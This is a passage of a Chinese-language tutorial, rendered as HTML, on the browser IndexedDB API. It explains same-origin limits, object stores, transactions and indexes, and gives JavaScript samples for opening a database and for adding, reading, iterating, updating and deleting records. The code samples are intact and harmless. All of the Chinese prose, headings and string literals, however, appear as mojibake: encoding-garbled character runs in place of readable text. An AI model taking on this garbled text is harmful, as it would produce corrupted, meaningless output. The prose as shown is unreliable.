<p><strong>ï¼ˆ4ï¼‰åŒæºé™åˆ¶ã€‚</strong> IndexedDB å—åˆ°åŒæºé™åˆ¶ï¼Œæ¯ä¸€ä¸ªæ•°æ®åº“å¯¹åº”åˆ›å»ºå®ƒçš„åŸŸåã€‚ç½‘é¡µåªèƒ½è®¿é—®è‡ªèº«åŸŸåä¸‹çš„æ•°æ®åº“ï¼Œè€Œä¸èƒ½è®¿é—®è·¨åŸŸçš„æ•°æ®åº“ã€‚</p>
<p><strong>ï¼ˆ5ï¼‰å‚¨å­˜ç©ºé—´å¤§ã€‚</strong> IndexedDB çš„å‚¨å­˜ç©ºé—´æ¯” LocalStorage å¤§å¾—å¤šï¼Œä¸€èˆ¬æ¥è¯´ä¸å°‘äº 250MBï¼Œç”šè‡³æ²¡æœ‰ä¸Šé™ã€‚</p>
<p><strong>ï¼ˆ6ï¼‰æ”¯æŒäºŒè¿›åˆ¶å‚¨å­˜ã€‚</strong> IndexedDB ä¸ä»…å¯ä»¥å‚¨å­˜å­—ç¬¦ä¸²ï¼Œè¿˜å¯ä»¥å‚¨å­˜äºŒè¿›åˆ¶æ•°æ®ï¼ˆArrayBuffer å¯¹è±¡å’Œ Blob å¯¹è±¡ï¼‰ã€‚</p>
<h3 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h3><p>IndexedDB æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„ APIï¼Œæ¶‰åŠä¸å°‘æ¦‚å¿µã€‚å®ƒæŠŠä¸åŒçš„å®ä½“ï¼ŒæŠ½è±¡æˆä¸€ä¸ªä¸ªå¯¹è±¡æ¥å£ã€‚å­¦ä¹ è¿™ä¸ª APIï¼Œå°±æ˜¯å­¦ä¹ å®ƒçš„å„ç§å¯¹è±¡æ¥å£ã€‚</p>
<ul>
<li>æ•°æ®åº“ï¼šIDBDatabase å¯¹è±¡</li>
<li>å¯¹è±¡ä»“åº“ï¼šIDBObjectStore å¯¹è±¡</li>
<li>ç´¢å¼•ï¼š IDBIndex å¯¹è±¡</li>
<li>äº‹åŠ¡ï¼š IDBTransaction å¯¹è±¡</li>
<li>æ“ä½œè¯·æ±‚ï¼šIDBRequest å¯¹è±¡</li>
<li>æŒ‡é’ˆï¼š IDBCursor å¯¹è±¡</li>
<li>ä¸»é”®é›†åˆï¼šIDBKeyRange å¯¹è±¡</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€äº›ä¸»è¦çš„æ¦‚å¿µã€‚</p>
<p><strong>ï¼ˆ1ï¼‰æ•°æ®åº“</strong></p>
<p>æ•°æ®åº“æ˜¯ä¸€ç³»åˆ—ç›¸å…³æ•°æ®çš„å®¹å™¨ã€‚æ¯ä¸ªåŸŸåï¼ˆä¸¥æ ¼çš„è¯´ï¼Œæ˜¯åè®® + åŸŸå + ç«¯å£ï¼‰éƒ½å¯ä»¥æ–°å»ºä»»æ„å¤šä¸ªæ•°æ®åº“ã€‚</p>
<p>IndexedDB æ•°æ®åº“æœ‰ç‰ˆæœ¬çš„æ¦‚å¿µã€‚åŒä¸€ä¸ªæ—¶åˆ»ï¼Œåªèƒ½æœ‰ä¸€ä¸ªç‰ˆæœ¬çš„æ•°æ®åº“å­˜åœ¨ã€‚å¦‚æœè¦ä¿®æ”¹æ•°æ®åº“ç»“æ„ï¼ˆæ–°å¢æˆ–åˆ é™¤è¡¨ã€ç´¢å¼•æˆ–è€…ä¸»é”®ï¼‰ï¼Œåªèƒ½é€šè¿‡å‡çº§æ•°æ®åº“ç‰ˆæœ¬å®Œæˆã€‚</p>
<p><strong>ï¼ˆ2ï¼‰å¯¹è±¡ä»“åº“</strong></p>
<p>æ¯ä¸ªæ•°æ®åº“åŒ…å«è‹¥å¹²ä¸ªå¯¹è±¡ä»“åº“ï¼ˆobject storeï¼‰ã€‚å®ƒç±»ä¼¼äºå…³ç³»å‹æ•°æ®åº“çš„è¡¨æ ¼ã€‚</p>
<p><strong>ï¼ˆ3ï¼‰æ•°æ®è®°å½•</strong></p>
<p>å¯¹è±¡ä»“åº“ä¿å­˜çš„æ˜¯æ•°æ®è®°å½•ã€‚æ¯æ¡è®°å½•ç±»ä¼¼äºå…³ç³»å‹æ•°æ®åº“çš„è¡Œï¼Œä½†æ˜¯åªæœ‰ä¸»é”®å’Œæ•°æ®ä½“ä¸¤éƒ¨åˆ†ã€‚ä¸»é”®ç”¨æ¥å»ºç«‹é»˜è®¤çš„ç´¢å¼•ï¼Œå¿…é¡»æ˜¯ä¸åŒçš„ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ä¸»é”®å¯ä»¥æ˜¯æ•°æ®è®°å½•é‡Œé¢çš„ä¸€ä¸ªå±æ€§ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºä¸€ä¸ªé€’å¢çš„æ•´æ•°ç¼–å·ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; id: 1, text: &#39;foo&#39; &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„å¯¹è±¡ä¸­ï¼Œ<code>id</code>å±æ€§å¯ä»¥å½“ä½œä¸»é”®ã€‚</p>
<p>æ•°æ®ä½“å¯ä»¥æ˜¯ä»»æ„æ•°æ®ç±»å‹ï¼Œä¸é™äºå¯¹è±¡ã€‚</p>
<p><strong>ï¼ˆ4ï¼‰ç´¢å¼•</strong></p>
<p>ä¸ºäº†åŠ é€Ÿæ•°æ®çš„æ£€ç´¢ï¼Œå¯ä»¥åœ¨å¯¹è±¡ä»“åº“é‡Œé¢ï¼Œä¸ºä¸åŒçš„å±æ€§å»ºç«‹ç´¢å¼•ã€‚</p>
<p><strong>ï¼ˆ5ï¼‰äº‹åŠ¡</strong></p>
<p>æ•°æ®è®°å½•çš„è¯»å†™å’Œåˆ æ”¹ï¼Œéƒ½è¦é€šè¿‡äº‹åŠ¡å®Œæˆã€‚äº‹åŠ¡å¯¹è±¡æä¾›<code>error</code>ã€<code>abort</code>å’Œ<code>complete</code>ä¸‰ä¸ªäº‹ä»¶ï¼Œç”¨æ¥ç›‘å¬æ“ä½œç»“æœã€‚</p>
<h3 id="æ“ä½œæµç¨‹"><a href="#æ“ä½œæµç¨‹" class="headerlink" title="æ“ä½œæµç¨‹"></a>æ“ä½œæµç¨‹</h3><p>IndexedDB æ•°æ®åº“çš„å„ç§æ“ä½œï¼Œä¸€èˆ¬æ˜¯æŒ‰ç…§ä¸‹é¢çš„æµç¨‹è¿›è¡Œçš„ã€‚è¿™ä¸ªéƒ¨åˆ†åªç»™å‡ºç®€å•çš„ä»£ç ç¤ºä¾‹ï¼Œç”¨äºå¿«é€Ÿä¸Šæ‰‹ï¼Œè¯¦ç»†çš„å„ä¸ªå¯¹è±¡çš„ API æ”¾åœ¨åæ–‡ä»‹ç»ã€‚</p>
<h4 id="æ‰“å¼€æ•°æ®åº“"><a href="#æ‰“å¼€æ•°æ®åº“" class="headerlink" title="æ‰“å¼€æ•°æ®åº“"></a>æ‰“å¼€æ•°æ®åº“</h4><p>ä½¿ç”¨ IndexedDB çš„ç¬¬ä¸€æ­¥æ˜¯æ‰“å¼€æ•°æ®åº“ï¼Œä½¿ç”¨<code>indexedDB.open()</code>æ–¹æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var request &#x3D; window.indexedDB.open(databaseName, version);</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ•°æ®åº“çš„åå­—ã€‚å¦‚æœæŒ‡å®šçš„æ•°æ®åº“ä¸å­˜åœ¨ï¼Œå°±ä¼šæ–°å»ºæ•°æ®åº“ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•´æ•°ï¼Œè¡¨ç¤ºæ•°æ®åº“çš„ç‰ˆæœ¬ã€‚å¦‚æœçœç•¥ï¼Œæ‰“å¼€å·²æœ‰æ•°æ®åº“æ—¶ï¼Œé»˜è®¤ä¸ºå½“å‰ç‰ˆæœ¬ï¼›æ–°å»ºæ•°æ®åº“æ—¶ï¼Œé»˜è®¤ä¸º<code>1</code>ã€‚</p>
<p><code>indexedDB.open()</code>æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡é€šè¿‡ä¸‰ç§äº‹ä»¶<code>error</code>ã€<code>success</code>ã€<code>upgradeneeded</code>ï¼Œå¤„ç†æ‰“å¼€æ•°æ®åº“çš„æ“ä½œç»“æœã€‚</p>
<p><strong>ï¼ˆ1ï¼‰error äº‹ä»¶</strong></p>
<p><code>error</code>äº‹ä»¶è¡¨ç¤ºæ‰“å¼€æ•°æ®åº“å¤±è´¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">request.onerror &#x3D; function (event) &#123;</span><br><span class="line">  console.log(&#39;æ•°æ®åº“æ‰“å¼€æŠ¥é”™&#39;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ2ï¼‰success äº‹ä»¶</strong></p>
<p><code>success</code>äº‹ä»¶è¡¨ç¤ºæˆåŠŸæ‰“å¼€æ•°æ®åº“ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var db;</span><br><span class="line"></span><br><span class="line">request.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">  db &#x3D; request.result;</span><br><span class="line">  console.log(&#39;æ•°æ®åº“æ‰“å¼€æˆåŠŸ&#39;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶ï¼Œé€šè¿‡<code>request</code>å¯¹è±¡çš„<code>result</code>å±æ€§æ‹¿åˆ°æ•°æ®åº“å¯¹è±¡ã€‚</p>
<p><strong>ï¼ˆ3ï¼‰upgradeneeded äº‹ä»¶</strong></p>
<p>å¦‚æœæŒ‡å®šçš„ç‰ˆæœ¬å·ï¼Œå¤§äºæ•°æ®åº“çš„å®é™…ç‰ˆæœ¬å·ï¼Œå°±ä¼šå‘ç”Ÿæ•°æ®åº“å‡çº§äº‹ä»¶<code>upgradeneeded</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var db;</span><br><span class="line"></span><br><span class="line">request.onupgradeneeded &#x3D; function (event) &#123;</span><br><span class="line">  db &#x3D; event.target.result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶é€šè¿‡äº‹ä»¶å¯¹è±¡çš„<code>target.result</code>å±æ€§ï¼Œæ‹¿åˆ°æ•°æ®åº“å®ä¾‹ã€‚</p>
<h4 id="æ–°å»ºæ•°æ®åº“"><a href="#æ–°å»ºæ•°æ®åº“" class="headerlink" title="æ–°å»ºæ•°æ®åº“"></a>æ–°å»ºæ•°æ®åº“</h4><p>æ–°å»ºæ•°æ®åº“ä¸æ‰“å¼€æ•°æ®åº“æ˜¯åŒä¸€ä¸ªæ“ä½œã€‚å¦‚æœæŒ‡å®šçš„æ•°æ®åº“ä¸å­˜åœ¨ï¼Œå°±ä¼šæ–°å»ºã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼Œåç»­çš„æ“ä½œä¸»è¦åœ¨<code>upgradeneeded</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°é‡Œé¢å®Œæˆï¼Œå› ä¸ºè¿™æ—¶ç‰ˆæœ¬ä»æ— åˆ°æœ‰ï¼Œæ‰€ä»¥ä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ã€‚</p>
<p>é€šå¸¸ï¼Œæ–°å»ºæ•°æ®åº“ä»¥åï¼Œç¬¬ä¸€ä»¶äº‹æ˜¯æ–°å»ºå¯¹è±¡ä»“åº“ï¼ˆå³æ–°å»ºè¡¨ï¼‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">request.onupgradeneeded &#x3D; function(event) &#123;</span><br><span class="line">  db &#x3D; event.target.result;</span><br><span class="line">  var objectStore &#x3D; db.createObjectStore(&#39;person&#39;, &#123; keyPath: &#39;id&#39; &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ•°æ®åº“æ–°å»ºæˆåŠŸä»¥åï¼Œæ–°å¢ä¸€å¼ å«åš<code>person</code>çš„è¡¨æ ¼ï¼Œä¸»é”®æ˜¯<code>id</code>ã€‚</p>
<p>æ›´å¥½çš„å†™æ³•æ˜¯å…ˆåˆ¤æ–­ä¸€ä¸‹ï¼Œè¿™å¼ è¡¨æ ¼æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨å†æ–°å»ºã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.onupgradeneeded &#x3D; function (event) &#123;</span><br><span class="line">  db &#x3D; event.target.result;</span><br><span class="line">  var objectStore;</span><br><span class="line">  if (!db.objectStoreNames.contains(&#39;person&#39;)) &#123;</span><br><span class="line">    objectStore &#x3D; db.createObjectStore(&#39;person&#39;, &#123; keyPath: &#39;id&#39; &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»é”®ï¼ˆkeyï¼‰æ˜¯é»˜è®¤å»ºç«‹ç´¢å¼•çš„å±æ€§ã€‚æ¯”å¦‚ï¼Œæ•°æ®è®°å½•æ˜¯<code>{ id: 1, name: &#39;å¼ ä¸‰&#39; }</code>ï¼Œé‚£ä¹ˆ<code>id</code>å±æ€§å¯ä»¥ä½œä¸ºä¸»é”®ã€‚ä¸»é”®ä¹Ÿå¯ä»¥æŒ‡å®šä¸ºä¸‹ä¸€å±‚å¯¹è±¡çš„å±æ€§ï¼Œæ¯”å¦‚<code>{ foo: { bar: &#39;baz&#39; } }</code>çš„<code>foo.bar</code>ä¹Ÿå¯ä»¥æŒ‡å®šä¸ºä¸»é”®ã€‚</p>
<p>å¦‚æœæ•°æ®è®°å½•é‡Œé¢æ²¡æœ‰åˆé€‚ä½œä¸ºä¸»é”®çš„å±æ€§ï¼Œé‚£ä¹ˆå¯ä»¥è®© IndexedDB è‡ªåŠ¨ç”Ÿæˆä¸»é”®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var objectStore &#x3D; db.createObjectStore(</span><br><span class="line">  &#39;person&#39;,</span><br><span class="line">  &#123; autoIncrement: true &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼ŒæŒ‡å®šä¸»é”®ä¸ºä¸€ä¸ªé€’å¢çš„æ•´æ•°ã€‚</p>
<p>æ–°å»ºå¯¹è±¡ä»“åº“ä»¥åï¼Œä¸‹ä¸€æ­¥å¯ä»¥æ–°å»ºç´¢å¼•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">request.onupgradeneeded &#x3D; function(event) &#123;</span><br><span class="line">  db &#x3D; event.target.result;</span><br><span class="line">  var objectStore &#x3D; db.createObjectStore(&#39;person&#39;, &#123; keyPath: &#39;id&#39; &#125;);</span><br><span class="line">  objectStore.createIndex(&#39;name&#39;, &#39;name&#39;, &#123; unique: false &#125;);</span><br><span class="line">  objectStore.createIndex(&#39;email&#39;, &#39;email&#39;, &#123; unique: true &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>IDBObject.createIndex()</code>çš„ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸ºç´¢å¼•åç§°ã€ç´¢å¼•æ‰€åœ¨çš„å±æ€§ã€é…ç½®å¯¹è±¡ï¼ˆè¯´æ˜è¯¥å±æ€§æ˜¯å¦åŒ…å«é‡å¤çš„å€¼ï¼‰ã€‚</p>
<h4 id="æ–°å¢æ•°æ®"><a href="#æ–°å¢æ•°æ®" class="headerlink" title="æ–°å¢æ•°æ®"></a>æ–°å¢æ•°æ®</h4><p>æ–°å¢æ•°æ®æŒ‡çš„æ˜¯å‘å¯¹è±¡ä»“åº“å†™å…¥æ•°æ®è®°å½•ã€‚è¿™éœ€è¦é€šè¿‡äº‹åŠ¡å®Œæˆã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function add() &#123;</span><br><span class="line">  var request &#x3D; db.transaction([&#39;person&#39;], &#39;readwrite&#39;)</span><br><span class="line">    .objectStore(&#39;person&#39;)</span><br><span class="line">    .add(&#123; id: 1, name: &#39;å¼ ä¸‰&#39;, age: 24, email: &#39;zhangsan@example.com&#39; &#125;);</span><br><span class="line"></span><br><span class="line">  request.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;æ•°æ®å†™å…¥æˆåŠŸ&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  request.onerror &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;æ•°æ®å†™å…¥å¤±è´¥&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add();</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œå†™å…¥æ•°æ®éœ€è¦æ–°å»ºä¸€ä¸ªäº‹åŠ¡ã€‚æ–°å»ºæ—¶å¿…é¡»æŒ‡å®šè¡¨æ ¼åç§°å’Œæ“ä½œæ¨¡å¼ï¼ˆâ€œåªè¯»â€æˆ–â€œè¯»å†™â€ï¼‰ã€‚æ–°å»ºäº‹åŠ¡ä»¥åï¼Œé€šè¿‡<code>IDBTransaction.objectStore(name)</code>æ–¹æ³•ï¼Œæ‹¿åˆ° IDBObjectStore å¯¹è±¡ï¼Œå†é€šè¿‡è¡¨æ ¼å¯¹è±¡çš„<code>add()</code>æ–¹æ³•ï¼Œå‘è¡¨æ ¼å†™å…¥ä¸€æ¡è®°å½•ã€‚</p>
<p>å†™å…¥æ“ä½œæ˜¯ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼Œé€šè¿‡ç›‘å¬è¿æ¥å¯¹è±¡çš„<code>success</code>äº‹ä»¶å’Œ<code>error</code>äº‹ä»¶ï¼Œäº†è§£æ˜¯å¦å†™å…¥æˆåŠŸã€‚</p>
<h4 id="è¯»å–æ•°æ®"><a href="#è¯»å–æ•°æ®" class="headerlink" title="è¯»å–æ•°æ®"></a>è¯»å–æ•°æ®</h4><p>è¯»å–æ•°æ®ä¹Ÿæ˜¯é€šè¿‡äº‹åŠ¡å®Œæˆã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function read() &#123;</span><br><span class="line">   var transaction &#x3D; db.transaction([&#39;person&#39;]);</span><br><span class="line">   var objectStore &#x3D; transaction.objectStore(&#39;person&#39;);</span><br><span class="line">   var request &#x3D; objectStore.get(1);</span><br><span class="line"></span><br><span class="line">   request.onerror &#x3D; function(event) &#123;</span><br><span class="line">     console.log(&#39;äº‹åŠ¡å¤±è´¥&#39;);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   request.onsuccess &#x3D; function( event) &#123;</span><br><span class="line">      if (request.result) &#123;</span><br><span class="line">        console.log(&#39;Name: &#39; + request.result.name);</span><br><span class="line">        console.log(&#39;Age: &#39; + request.result.age);</span><br><span class="line">        console.log(&#39;Email: &#39; + request.result.email);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        console.log(&#39;æœªè·å¾—æ•°æ®è®°å½•&#39;);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">read();</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>objectStore.get()</code>æ–¹æ³•ç”¨äºè¯»å–æ•°æ®ï¼Œå‚æ•°æ˜¯ä¸»é”®çš„å€¼ã€‚</p>
<h4 id="éå†æ•°æ®"><a href="#éå†æ•°æ®" class="headerlink" title="éå†æ•°æ®"></a>éå†æ•°æ®</h4><p>éå†æ•°æ®è¡¨æ ¼çš„æ‰€æœ‰è®°å½•ï¼Œè¦ä½¿ç”¨æŒ‡é’ˆå¯¹è±¡ IDBCursorã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function readAll() &#123;</span><br><span class="line">  var objectStore &#x3D; db.transaction(&#39;person&#39;).objectStore(&#39;person&#39;);</span><br><span class="line"></span><br><span class="line">   objectStore.openCursor().onsuccess &#x3D; function (event) &#123;</span><br><span class="line">     var cursor &#x3D; event.target.result;</span><br><span class="line"></span><br><span class="line">     if (cursor) &#123;</span><br><span class="line">       console.log(&#39;Id: &#39; + cursor.key);</span><br><span class="line">       console.log(&#39;Name: &#39; + cursor.value.name);</span><br><span class="line">       console.log(&#39;Age: &#39; + cursor.value.age);</span><br><span class="line">       console.log(&#39;Email: &#39; + cursor.value.email);</span><br><span class="line">       cursor.continue();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      console.log(&#39;æ²¡æœ‰æ›´å¤šæ•°æ®äº†ï¼&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">readAll();</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ–°å»ºæŒ‡é’ˆå¯¹è±¡çš„<code>openCursor()</code>æ–¹æ³•æ˜¯ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼Œæ‰€ä»¥è¦ç›‘å¬<code>success</code>äº‹ä»¶ã€‚</p>
<h4 id="æ›´æ–°æ•°æ®"><a href="#æ›´æ–°æ•°æ®" class="headerlink" title="æ›´æ–°æ•°æ®"></a>æ›´æ–°æ•°æ®</h4><p>æ›´æ–°æ•°æ®è¦ä½¿ç”¨<code>IDBObject.put()</code>æ–¹æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function update() &#123;</span><br><span class="line">  var request &#x3D; db.transaction([&#39;person&#39;], &#39;readwrite&#39;)</span><br><span class="line">    .objectStore(&#39;person&#39;)</span><br><span class="line">    .put(&#123; id: 1, name: &#39;æå››&#39;, age: 35, email: &#39;lisi@example.com&#39; &#125;);</span><br><span class="line"></span><br><span class="line">  request.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;æ•°æ®æ›´æ–°æˆåŠŸ&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  request.onerror &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;æ•°æ®æ›´æ–°å¤±è´¥&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">update();</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>put()</code>æ–¹æ³•è‡ªåŠ¨æ›´æ–°äº†ä¸»é”®ä¸º<code>1</code>çš„è®°å½•ã€‚</p>
<h4 id="åˆ é™¤æ•°æ®"><a href="#åˆ é™¤æ•°æ®" class="headerlink" title="åˆ é™¤æ•°æ®"></a>åˆ é™¤æ•°æ®</h4><p><code>IDBObjectStore.delete()</code>æ–¹æ³•ç”¨äºåˆ é™¤è®°å½•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function remove() &#123;</span><br><span class="line">  var request &#x3D; db.transaction([&#39;person&#39;], &#39;readwrite&#39;)</span><br><span class="line">    .objectStore(&#39;person&#39;)</span><br><span class="line">    .delete(1);</span><br><span class="line"></span><br><span class="line">  request.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;æ•°æ®åˆ é™¤æˆåŠŸ&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">remove();</span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨ç´¢å¼•"><a href="#ä½¿ç”¨ç´¢å¼•" class="headerlink" title="ä½¿ç”¨ç´¢å¼•"></a>ä½¿ç”¨ç´¢å¼•</h4><p>ç´¢å¼•çš„æ„ä¹‰åœ¨äºï¼Œå¯ä»¥è®©ä½ æœç´¢ä»»æ„å­—æ®µï¼Œä¹Ÿå°±æ˜¯è¯´ä»ä»»æ„å­—æ®µæ‹¿åˆ°æ•°æ®è®°å½•ã€‚å¦‚æœä¸å»ºç«‹ç´¢å¼•ï¼Œé»˜è®¤åªèƒ½æœç´¢ä¸»é”®ï¼ˆå³ä»ä¸»é”®å–å€¼ï¼‰ã€‚</p>
<p>å‡å®šæ–°å»ºè¡¨æ ¼çš„æ—¶å€™ï¼Œå¯¹<code>name</code>å­—æ®µå»ºç«‹äº†ç´¢å¼•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.createIndex(&#39;name&#39;, &#39;name&#39;, &#123; unique: false &#125;);</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ï¼Œå°±å¯ä»¥ä»<code>name</code>æ‰¾åˆ°å¯¹åº”çš„æ•°æ®è®°å½•äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var transaction &#x3D; db.transaction([&#39;person&#39;], &#39;readonly&#39;);</span><br><span class="line">var store &#x3D; transaction.objectStore(&#39;person&#39;);</span><br><span class="line">var index &#x3D; store.index(&#39;name&#39;);</span><br><span class="line">var request &#x3D; index.get(&#39;æå››&#39;);</span><br><span class="line"></span><br><span class="line">request.onsuccess &#x3D; function (e) &#123;</span><br><span class="line">  var result &#x3D; e.target.result;</span><br><span class="line">  if (result) &#123;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

